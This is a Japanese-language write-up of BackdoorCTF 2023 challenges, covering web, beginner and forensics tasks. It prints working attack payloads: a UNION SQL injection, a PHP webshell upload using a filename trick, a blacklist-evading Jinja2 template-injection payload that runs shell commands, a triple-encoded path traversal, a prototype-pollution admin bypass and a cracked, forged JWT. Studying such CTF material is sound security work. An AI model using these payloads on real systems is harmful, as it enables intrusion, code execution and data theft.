# BackdoorCTF 2023

BackdoorCTF 2023（<https://ctftime.org/event/2153>）に参加しました。  
土, 16 12月 2023, 12:00 UTC — 月, 18 12月 2023, 12:00 UTC

年末で忙しいため、簡易的なwriteupになります。  
難易度としてはそこまで難しくはなかったため、Webはもっと解けれたと思います。

<!-- @import "[TOC]" {cmd="toc" depthFrom=2 depthTo=3 orderedList=false} -->

<!-- code_chunk_output -->

- [Web](#web)
  - [too-many-admins](#too-many-admins)
  - [php_sucks](#php_sucks)
  - [Unintelligible-Chatbot](#unintelligible-chatbot)
  - [space-war](#space-war)
  - [armoured-notes](#armoured-notes)
- [Beginner](#beginner)
  - [mini_RSA](#mini_rsa)
  - [secret_of_j4ck4l](#secret_of_j4ck4l)
  - [Secret-of-Kurama](#secret-of-kurama)
- [Forensics](#forensics)
  - [Forenscript](#forenscript)

<!-- /code_chunk_output -->

## Web

### too-many-admins

SQLインジェクションを実行すればフラグがもらえました。

```text
/?user=test' union select username, bio, password FROM users-- -
```

- Flag

```text
flag{1m40_php_15_84d_47_d1ff323n71471n9_7yp35}
```

### php_sucks

PHP+画像のWebShellアップロード問題でした。  
特徴としては、MIMEタイプのチェックが入るのですが、`$`が含まれているとそこで区切られる点です。

```php
<SNIP>
$allowedMimeTypes=['image/jpeg','image/jpg','image/png'];
$fileName=strtok($fileName,chr(7841151584512418084));
if(in_array($fileMimeType,$allowedMimeTypes)){
<SNIP>
```

ファイル名を以下のようにしたWebShellをアップロードすればよいです。
WebShellファイルとしては以下を利用しました。  
<https://github.com/jgor/php-jpeg-shell>

```text
shell.php$.jpg
```

- Flag

```text
flag{n0t_3v3ry_t1m3_y0u_w1ll_s33_nu11byt3_vuln3r4b1l1ty_0sdfdgh554fd}
```

### Unintelligible-Chatbot

- ソースコード無し

SSTIをする問題でしたが、一部の文字列が禁止リストに入っているようでした。  
ブラックボックスでの調査の結果、少なくとも以下の文字列は禁止リストに入っていることがわかりました。

```text
[
]
.
_
#
%
subclasses
config
init
```

アンダーバーとかはUnicodeコードポイントを利用することで回避できるので、以下のようにすることで動かすことができました。  
<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2>

```py
# 元々
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}

# 変換後
{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5f\x73ubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(107)|attr('\x5f\x5f\x69nit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('sys')|attr('modules')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('cat+flag')|attr('read')()}}
```

- Flag

```text
flag{n07_4n07h3r_5571_ch4ll3n63}
```

### space-war

- ソースコード無し
- 問題文

```text
i started war as i don't like EQUALity, i lost, they cut every LETTER of my name and sent them to different ROUTES. Wanna know my name in L33t???
```

解けなかった問題。  
ログイン画面のみで、ログインができればフラグがもらえるっぽいです。  
SQLインジェクションができそうな気がしたのですが、どうやってもうまくいきませんでした。  
エラーメッセージ的に、特定の文字が禁止されているような挙動でした。

他の人のWriteupを見た感じだと、存在するユーザ名を一文字ずつパスに含めることで、ユーザ名を特定できたらしいです。  
ユーザ名特定後、SQLインジェクションでログインが可能になるというものでした。

### armoured-notes

解けなかったXSSの問題。  
prototype pollutionを利用して、認証バイパスまではできたが、肝心のXSS発火箇所がわからなかった。

認証バイパスは以下のようにするとできました。

```json
{"__proto__":{"isAdmin":true},"uname":"admin","pass":"Doe","message":"Your note..."}
```

肝心のXSSはどうやらライブラリの脆弱性を利用するようでした。  
ソースコードは配られていたので、`npm audit`ぐらいはすればよかったです。

## Beginner

### mini_RSA

e=3なので、Wiener's attackが使えそうです。  
あとは暗号文のe乗根を求めるだけでフラグがもらえました。

- Flag

```text
flag{S0_y0u_c4n_s0lv3_s0m3_RSA}
```

### secret_of_j4ck4l

unquoteのバイパス問題。  
明らかにパストラバーサルができそうです。

```py
<SNIP>
def ignore_it(file_param):
    yoooo = file_param.replace('.', '').replace('/', '')
    if yoooo != file_param:
        return "Illegal characters detected in file parameter!"
    return yoooo

def another_useless_function(file_param):
    return urllib.parse.unquote(file_param)

def url_encode_path(file_param):
    return urllib.parse.quote(file_param, safe='')

def useless (file_param):
    file_param1 = ignore_it(file_param)
    file_param2 = another_useless_function(file_param1)
    file_param3 = ignore_it(file_param2)
    file_param4 = another_useless_function(file_param3)
    file_param5 = another_useless_function(file_param4)
    return file_param5
<SNIP>
```

以下の文字列を3回URLエンコードして送ることで、`useless`の判定処理を回避して任意のファイルを読み込ませることが可能です。

```text
../flag.txt
```

- ペイロード

```text
http://34.132.132.69:8003/read_secret_message?file=%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%36%25%32%35%25%33%36%25%33%36%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%31%25%32%35%25%33%36%25%33%37%25%32%35%25%33%32%25%36%35%25%32%35%25%33%37%25%33%34%25%32%35%25%33%37%25%33%38%25%32%35%25%33%37%25%33%34
```

- Flag

```text
flag{s1mp13_l0c4l_f1l3_1nclus10n_0dg4af52gav}
```

### Secret-of-Kurama

- 問題文

```text
Madara attacked leaf village. everyone wants Naruto to turn into Nine-Tails, Naruto don't know what's the SECRET to change its role to 'NineTails'? can you as a shinobi help Naruto??? username: Naruto Password: Chakra
```

問題文に書いてある認証情報でログインすると、JWTが発行されていることがわかります。  
None攻撃は使えませんでしたが、何回ログインしても同じJWTが発行されていたため、SECRETが固定値であると推測しました。

john the ripperで総当たり攻撃を行います。

```text
$ john jwt                           
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 AVX 4x])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
minato           (?)     
1g 0:00:00:00 DONE 3/3 (2023-12-17 07:30) 3.571g/s 589421p/s 589421c/s 589421C/s 025245..11021
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

SECRETが`minato`であることがわかりました。  
後は、JWTを生成して、問題通りにroleを`NineTails`にすれば良いです。

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ik5hcnV0byIsInJvbGUiOiJOaW5lVGFpbHMifQ.rDZ26ZE_F4l0Ve4E-2sKP4qKNuadhLU8nrThW7YGVPg
```

- Flag

```text
flag{y0u_ar3_tru3_L34F_sh1n0b1_bf56gtr59894}
```

## Forensics

### Forenscript

あるファイルが渡されます。  
`file`や`binwalk`でも特に情報が得られなかったので、Hexエディタで中身を見てみます。

```text
00000000: 474e 5089 0a1a 0a0d 0d00 0000 5244 4849  GNP.........RDHI
00000010: 460c 0000 a504 0000 0000 0608 3dab 1f00  F...........=...
00000020: 0000 007c 4752 7301 ceae 0042 0000 e91c  ...|GRs....B....
00000030: 4167 0400 0000 414d fc0b 8fb1 0000 0561  Ag....AM.......a
00000040: 4870 0900 0000 7359 0000 871d 8f01 871d  Hp....sY........
<SNIP>
```

`GNP`や`RDHI`といった見覚えのありそうな文字列が先頭に含まれています。  
このことから、PNGファイルのヘッダが逆順になっているのではないかと推測しました。  
つまり、4バイトの塊毎に逆順にすれば良さそうです。

- solver.py

```py
import struct

def swap_bytes(input_file, output_file):
    with open(input_file, 'rb') as f:
        data = f.read()

    # 4バイトごとに順番を入れ替える
    swapped_data = bytearray()
    for i in range(0, len(data), 4):
        chunk = data[i:i+4]
        if len(chunk) == 4:
            # バイトオーダーを入れ替える
            swapped_chunk = struct.unpack('>I', chunk)[0]
            swapped_data.extend(struct.pack('<I', swapped_chunk))

    with open(output_file, 'wb') as f:
        f.write(swapped_data)

# 使用例
input_file_path = 'a.bin'
output_file_path = 'output.png'
swap_bytes(input_file_path, output_file_path)
```

雑に変換スクリプトを書いて、実行するすると画像が出力されました。

![Forenscript 01](./images/output.png)

FAKEと書かれているため、さらに深堀が必要そうです。  
よく見ると、画像下部の表示がおかしかったため、`binwalk`で調べてみます。

```sh
$ binwalk -D=".*" output.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 3142 x 1189, 8-bit/color RGBA, non-interlaced
91            0x5B            Zlib compressed data, compressed
60048         0xEA90          PNG image, 3142 x 1189, 8-bit/color RGBA, non-interlaced
60139         0xEAEB          Zlib compressed data, compressed
```

もう一つ画像ファイルが含まれているようでした。  

![Forenscript 02](./images/EA90.png)

- Flag

```text
flag{scr1pt1ng_r34lly_t0ugh_a4n't_1t??}
```
